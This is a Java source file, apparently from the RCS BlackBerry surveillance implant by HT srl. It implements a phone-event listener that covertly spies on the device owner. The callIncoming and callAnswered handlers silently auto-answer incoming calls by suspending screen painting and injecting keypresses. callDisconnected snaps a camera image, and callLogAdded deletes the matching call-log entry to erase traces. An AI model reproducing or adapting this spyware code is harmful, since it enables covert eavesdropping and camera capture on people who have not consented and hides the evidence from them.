//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import javax.microedition.lcdui.Image;
import javax.microedition.lcdui.ImageItem;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.EventInjector;
import net.rim.device.api.system.HolsterListener;
import net.rim.device.api.system.KeypadListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.SystemListener;
import net.rim.device.api.system.SystemListener2;
import net.rim.device.api.system.EventInjector.KeyCodeEvent;
import net.rim.device.api.system.EventInjector.KeyEvent;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import blackberry.agent.SnapShotAgent;
import blackberry.interfaces.ApplicationListObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.interfaces.Singleton;
import blackberry.record.CameraRecorder;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener implements RadioStatusListener, HolsterListener,
        SystemListener, SystemListener2, PhoneListener, PhoneLogListener,
        Singleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("AppListener", DebugLevel.VERBOSE);

    //#endif

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationListObservers = new Vector();
    Vector backlightObservers = new Vector();

    Task task;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {
        lastStatus = DeviceInfo.getBatteryStatus();
        task = Task.getInstance();

        //ScreenFake.Push();
    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = new AppListener();
        }
        return instance;
    }

    /**
     * Adds the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addBatteryStatusObserver(
            final BatteryStatusObserver observer) {

        //#ifdef DBC
        Check.requires(!batteryStatusObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);
        //#endif
        if (!batteryStatusObservers.contains(observer)) {
            batteryStatusObservers.addElement(observer);
        }
    }

    /**
     * Adds the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void addApplicationListObserver(
            final ApplicationListObserver observer) {

        //#ifdef DBC
        Check.requires(!applicationListObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);
        //#endif
        if (!applicationListObservers.contains(observer)) {
            applicationListObservers.addElement(observer);
        }
    }

    public synchronized void addBacklightObserver(
            final BacklightObserver observer) {

        //#ifdef DBC
        Check.requires(!backlightObservers.contains(observer),
                "already observing");
        //#endif

        //#ifdef DEBUG_TRACE
        debug.trace("adding observer: " + observer);
        //#endif
        if (!backlightObservers.contains(observer)) {
            backlightObservers.addElement(observer);
        }
    }

    /**
     * Removes the battery status observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (batteryStatusObservers.contains(observer)) {
            batteryStatusObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    /**
     * Removes the application list observer.
     * 
     * @param observer
     *            the observer
     */
    public synchronized void removeApplicationListObserver(
            final ApplicationListObserver observer) {
        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (applicationListObservers.contains(observer)) {
            applicationListObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    public synchronized void removeBacklightObserver(
            final BacklightObserver observer) {

        //#ifdef DEBUG_TRACE
        debug.trace("removing observer: " + observer);
        //#endif

        if (backlightObservers.contains(observer)) {
            backlightObservers.removeElement(observer);
        } else {
            //#ifdef DEBUG
            debug.error("removing observer not present: " + observer);
            //#endif
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#baseStationChange()
     */
    public void baseStationChange() {
        //#ifdef DEBUG_INFO
        debug.info("baseStationChange");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryGood()
     */
    public void batteryGood() {
        //#ifdef DEBUG_INFO
        debug.info("batteryGood");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryLow()
     */
    public void batteryLow() {
        //#ifdef DEBUG_INFO
        debug.info("batteryLow");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    public synchronized void batteryStatusChange(final int status) {
        //#ifdef DEBUG_INFO
        debug.info("batteryStatusChange arg: " + status);
        //#endif

        final int diff = (status ^ lastStatus);

        final int size = batteryStatusObservers.size();
        for (int i = 0; i < size; i++) {

            final BatteryStatusObserver observer = (BatteryStatusObserver) batteryStatusObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBatteryStatusChange(status, diff);
        }

        lastStatus = status;
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    /**
     * Application list change.
     * 
     * @param startedList
     *            the started list
     * @param stoppedList
     *            the stopped list
     * @param stoppedListMod
     * @param startedListMod
     */
    public synchronized void applicationListChange(
            final Vector startedListName, final Vector stoppedListName,
            final Vector startedListMod, final Vector stoppedListMod) {
        //#ifdef DEBUG_INFO
        debug.info("applicationListChange start: " + startedListName.size()
                + " stopped: " + stoppedListName.size());
        //#endif

        //#ifdef DBC
        Check.requires(startedListName.size() == startedListMod.size(),
                "applicationListChange");
        Check.requires(stoppedListName.size() == stoppedListMod.size(),
                "applicationListChange");
        //#endif

        final int size = applicationListObservers.size();
        for (int i = 0; i < size; i++) {

            final ApplicationListObserver observer = (ApplicationListObserver) applicationListObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onApplicationListChange(startedListName, stoppedListName,
                    startedListMod, stoppedListMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#inHolster()
     */
    public void inHolster() {
        //#ifdef DEBUG_INFO
        debug.info("inHolster");
        //#endif

        // interrompe l'analisi degli applicativi
        task.stopApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#outOfHolster()
     */
    public void outOfHolster() {
        //#ifdef DEBUG_INFO
        debug.info("outOfHolster");
        //#endif

        // riprende l'analisi degli applicativi
        // se c'e' una variazione nella lista comunica la lista agli observer
        // viene fatto con un timer
        task.startApplicationTimer();
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkScanComplete(boolean
     * )
     */
    public void networkScanComplete(final boolean success) {
        //#ifdef DEBUG_INFO
        debug.info("networkScanComplete success: " + success);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkServiceChange(int,
     * int)
     */
    public void networkServiceChange(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkServiceChange networkId: " + networkId
                + " service : " + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#networkStarted(int,
     * int)
     */
    public void networkStarted(final int networkId, final int service) {
        //#ifdef DEBUG_INFO
        debug.info("networkStarted networkId: " + networkId + " service : "
                + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkStateChange(int)
     */
    public void networkStateChange(final int state) {
        //#ifdef DEBUG_INFO
        debug.info("networkStateChange state: " + state);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#pdpStateChange(int,
     * int, int)
     */
    public void pdpStateChange(final int apn, final int state, final int cause) {
        //#ifdef DEBUG_INFO
        debug.info("pdpStateChange apn: " + apn + " state: " + state
                + "cause :" + cause);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerOff()
     */
    public void powerOff() {
        //#ifdef DEBUG_INFO
        debug.info("powerOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerUp()
     */
    public void powerUp() {
        //#ifdef DEBUG_INFO
        debug.info("powerUp");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#radioTurnedOff()
     */
    public void radioTurnedOff() {
        //#ifdef DEBUG_INFO
        debug.info("radioTurnedOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#signalLevel(int)
     */
    public void signalLevel(final int level) {
        //#ifdef DEBUG_INFO
        debug.info("signalLevel: " + level);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {
        //#ifdef DEBUG_INFO
        debug.info("backlightStateChange: " + on);
        //#endif

        final int size = backlightObservers.size();
        for (int i = 0; i < size; i++) {

            final BacklightObserver observer = (BacklightObserver) backlightObservers
                    .elementAt(i);
            //#ifdef DEBUG_TRACE
            debug.trace("notify: " + observer);
            //#endif

            observer.onBacklightChange(on);
        }

    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#cradleMismatch(boolean)
     */
    public void cradleMismatch(final boolean mismatch) {
        //#ifdef DEBUG_INFO
        debug.info("cradleMismatch: " + mismatch);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#fastReset()
     */
    public void fastReset() {
        //#ifdef DEBUG_INFO
        debug.info("fastReset");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#powerOffRequested(int)
     */
    public void powerOffRequested(final int reason) {
        //#ifdef DEBUG_INFO
        debug.info("powerOffRequested: " + reason);
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#usbConnectionStateChange(int)
     */
    public void usbConnectionStateChange(final int state) {
        //#ifdef DEBUG_INFO
        debug.info("usbConnectionStateChange: " + state);
        //#endif
    }

    public void callAdded(int arg0) {
        //#ifdef DEBUG_INFO
        debug.info("callAddedd: " + arg0);
        //#endif
    }

    public void callConferenceCallEstablished(int arg0) {
        //#ifdef DEBUG_INFO
        debug.info("callConferenceCallEstablished: " + arg0);
        //#endif
    }

    public void callDirectConnectConnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callDirectConnectConnected: " + callId);
        //#endif
    }

    public void callDirectConnectDisconnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callDirectConnectDisconnected: " + callId);
        //#endif
    }

    public void callEndedByUser(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callEndedByUser: " + callId);
        //#endif
    }

    public void callFailed(int callId, int reason) {
        //#ifdef DEBUG_INFO
        debug.info("callFailed: " + callId);
        //#endif

    }

    public void callHeld(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callHeld: " + callId);
        //#endif
    }

    public void callInitiated(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callInitiated: " + callId);
        //#endif

    }

    public void callRemoved(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callRemoved: " + callId);
        //#endif
    }

    public void callResumed(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callResumed: " + callId);
        //#endif
    }

    public void callWaiting(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callWaiting: " + callId);
        //#endif
    }

    public void conferenceCallDisconnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("conferenceCallDisconnected: " + callId);
        //#endif
    }

    boolean autoanswer = false;

    public void callIncoming(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callIncoming: " + callId);
        //#endif

        PhoneCall phoneCall = Phone.getCall(callId);
        String number = phoneCall.getDisplayPhoneNumber();
        boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            //#ifdef DEBUG_INFO
            debug.info("answering");
            //#endif
            autoanswer = true;
            //ScreenFake.Push();
            synchronized (UiApplication.getEventLock()) {
            UiApplication.getUiApplication().suspendPainting(true);
            }
            
            Application.getApplication().invokeLater(new Runnable() {

                public void run() {
                    //Utils.sleep(100);
                    // Keypad.KEY_SEND
                    EventInjector.KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                            KeyCodeEvent.KEY_DOWN, (char) Keypad.KEY_SEND,
                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
                    EventInjector.KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
                            KeyCodeEvent.KEY_UP, (char) Keypad.KEY_SEND,
                            KeypadListener.STATUS_NOT_FROM_KEYPAD);

                    pressKey.post();
                    releaseKey.post();
                }
            });
        }
    }

    public void callDisconnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callDisconnected: " + callId);
        //#endif

        autoanswer = false;

        byte[] camera = CameraRecorder.snap();
        //#ifdef DEBUG_TRACE
        if (camera != null) {
            debug.trace("CameraRecorder.snap: " + camera.length);
        }
        //#endif
        //ScreenFake.Pop();
    }

    public void callConnected(int callId) {
        //#ifdef DEBUG_INFO
        debug.info("callConnected: " + callId);
        PhoneCall phoneCall = Phone.getCall(callId);
        debug.info("Phone call: " + phoneCall.getDisplayPhoneNumber());
        //#endif      
        synchronized (UiApplication.getEventLock()) {
        UiApplication.getUiApplication().suspendPainting(false);
        }
    }

    public void callAnswered(int arg0) {
        //#ifdef DEBUG_INFO
        debug.info("callAnswererd: " + arg0);
        //#endif

        if (autoanswer) {
            //Backlight.enable(false);
            Application.getApplication().invokeLater(new Runnable() {

                public void run() {
                    //ScreenFake.Push();
                    //Utils.sleep(100);
                    synchronized (UiApplication.getEventLock()) {
                        UiApplication.getUiApplication().suspendPainting(true);
                        }
                    
                    KeyCodeEvent pressKey = new EventInjector.KeyCodeEvent(
                            EventInjector.KeyCodeEvent.KEY_DOWN,
                            (char) Keypad.KEY_MENU,
                            KeypadListener.STATUS_NOT_FROM_KEYPAD);
                    KeyCodeEvent releaseKey = new EventInjector.KeyCodeEvent(
                            EventInjector.KeyCodeEvent.KEY_UP,
                            (char) Keypad.KEY_MENU,
                            KeypadListener.STATUS_NOT_FROM_KEYPAD);

                    pressKey.post();
                    releaseKey.post();

                    EventInjector.TrackwheelEvent e = new EventInjector.TrackwheelEvent(
                            EventInjector.TrackwheelEvent.THUMB_ROLL_DOWN, 9,
                            KeypadListener.STATUS_TRACKWHEEL);
                    EventInjector.invokeEvent(e);

                    e = new EventInjector.TrackwheelEvent(
                            EventInjector.TrackwheelEvent.THUMB_CLICK, 1,
                            KeypadListener.STATUS_TRACKWHEEL);
                    EventInjector.invokeEvent(e);
                    
                    
                    
                }
                
                
            });

        }
    }

    public void callLogAdded(CallLog callLog) {
        String notes = callLog.getNotes();
        //#ifdef DEBUG_TRACE
        debug.trace("callLogAdded: " + callLog.toString() + " notes: " + notes);
        //#endif            

        PhoneLogs phoneLogs = PhoneLogs.getInstance();

        if (PhoneCallLog.class.isAssignableFrom(callLog.getClass())) {
            PhoneCallLog phoneCallLog = (PhoneCallLog) callLog;
            PhoneCallLogID logID = phoneCallLog.getParticipant();
            //#ifdef DEBUG_TRACE
            debug.trace("date: " + callLog.getDate() + " number: "
                    + logID.getNumber());
            //#endif 
        }

        int num = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
        for (int i = 0; i < num; i++) {
            CallLog log = phoneLogs.callAt(i, PhoneLogs.FOLDER_NORMAL_CALLS);
            //#ifdef DEBUG_TRACE
            debug.trace("date: " + log.getDate());
            //#endif 
            if (callLog.getDate().getTime() == log.getDate().getTime()) {
                phoneLogs.deleteCall(i, PhoneLogs.FOLDER_NORMAL_CALLS);
                break;
            }
        }

        int newnum = phoneLogs.numberOfCalls(PhoneLogs.FOLDER_NORMAL_CALLS);
        //#ifdef DEBUG_TRACE
        debug.trace("num: " + num + " after delete:" + newnum);
        //#endif

    }

    public void callLogRemoved(CallLog arg0) {
        //#ifdef DEBUG_TRACE
        debug.trace("callLogRemoved: " + arg0.getDate());
        //#endif
    }

    public void callLogUpdated(CallLog arg0, CallLog arg1) {
        // TODO Auto-generated method stub

    }

    public void reset() {
        // TODO Auto-generated method stub

    }

}
